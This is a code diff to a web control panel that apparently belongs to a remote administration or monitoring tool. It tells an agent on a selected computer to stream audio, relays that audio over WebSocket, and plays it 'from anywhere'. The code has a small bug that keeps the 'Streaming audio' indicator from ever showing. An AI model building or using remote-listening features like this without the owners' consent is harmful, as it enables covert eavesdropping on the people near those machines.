@@ -1598,13 +1598,32 @@ function startAudioListen(){
   if(!id){toast('Select a computer','w');return;}
   audioListenId = id;
   const mode = document.getElementById('audioMode').value;
+  const pc   = pcs[id];
 
-  document.getElementById('audioStatus').textContent = 'Requesting audio stream…';
-  document.getElementById('audioStatus').style.color = 'var(--ylw)';
-  log(`Audio listen → ${pcs[id]?.name} (${mode})`,'ok');
+  document.getElementById('audioStatus').innerHTML =
+    `<span style="color:var(--ylw)">Connecting to ${esc(pc?.name||id)}…</span>`;
 
-  // Tell agent to start streaming — it replies with audio_stream_url
+  log(`Audio listen → ${pc?.name||id} (${mode})`,'ok');
+
+  // Initialize audio context early (needs user gesture)
+  ensureAudioCtx();
+
+  // Send command — agent will stream audio chunks via WebSocket relay
+  // AND send audio_stream_url for LAN direct access
   sendWS({type:'command', cmd:'start_audio_stream', targets:[id], mode});
+
+  // Show status after short delay
+  setTimeout(()=>{
+    const statusEl = document.getElementById('audioStatus');
+    if(statusEl && statusEl.innerHTML.includes('Connecting')){
+      statusEl.innerHTML = `
+        <div style="line-height:1.9;font-size:10px">
+          ⏳ Waiting for audio stream…<br>
+          Audio will play automatically when agent connects.<br>
+          <span style="color:var(--tx3)">Works from anywhere — streams via relay server.</span>
+        </div>`;
+    }
+  }, 3000);
 }
 
 function handleAudioStreamUrl(url, ip, port, mode){
@@ -1706,18 +1725,59 @@ function stopAudioListen(){
   log('Audio stopped','ok');
 }
 
-// Fallback WebSocket chunk handler (when HTTP not available)
+// ── WebSocket audio player (works from ANYWHERE on internet) ──────────────
+// Each chunk is a complete WAV file in base64.
+// We decode it with Web Audio API and schedule it for gapless playback.
+let _wsAudioCtx = null;
+let _wsNextTime  = 0;      // when to play next chunk (for gapless scheduling)
+let _wsPlaying   = false;
+
+function ensureAudioCtx(){
+  if(!_wsAudioCtx || _wsAudioCtx.state === 'closed'){
+    _wsAudioCtx = new (window.AudioContext || window.webkitAudioContext)();
+    _wsNextTime  = _wsAudioCtx.currentTime;
+  }
+  // Resume if suspended (browser autoplay policy)
+  if(_wsAudioCtx.state === 'suspended') _wsAudioCtx.resume();
+  return _wsAudioCtx;
+}
+
 function handleAudioChunk(b64data){
-  if(!audioCtx) audioCtx=new(window.AudioContext||window.webkitAudioContext)();
+  const ctx = ensureAudioCtx();
   try{
-    const raw=atob(b64data);
-    const buf=new Uint8Array(raw.length);
+    // Decode base64 to ArrayBuffer
+    const raw = atob(b64data);
+    const buf = new Uint8Array(raw.length);
     for(let i=0;i<raw.length;i++) buf[i]=raw.charCodeAt(i);
-    audioCtx.decodeAudioData(buf.buffer.slice(0),decoded=>{
-      const src=audioCtx.createBufferSource();
-      src.buffer=decoded;src.connect(audioCtx.destination);src.start();
+
+    // Each chunk is a complete WAV — decode it
+    ctx.decodeAudioData(buf.buffer, (decoded) => {
+      const src = ctx.createBufferSource();
+      src.buffer  = decoded;
+      src.connect(ctx.destination);
+
+      // Schedule gaplessly — play exactly when previous chunk ends
+      const now       = ctx.currentTime;
+      const startTime = Math.max(now, _wsNextTime);
+      src.start(startTime);
+      _wsNextTime = startTime + decoded.duration;
+      _wsPlaying  = true;
+
+      // Show playing indicator once
+      if(!_wsPlaying){
+        const statusEl = document.getElementById('audioStatus');
+        if(statusEl){
+          statusEl.textContent = '✅ Streaming audio (WebSocket relay)';
+          statusEl.style.color = 'var(--grn)';
+        }
+      }
+    }, (err) => {
+      // decodeAudioData failed — chunk may be malformed, skip it
+      console.warn('Audio decode error:', err);
     });
-  }catch(e){}
+  } catch(e){
+    console.warn('Audio chunk error:', e);
+  }
 }
 
 // WebRTC signaling handlers (for aiortc fallback)
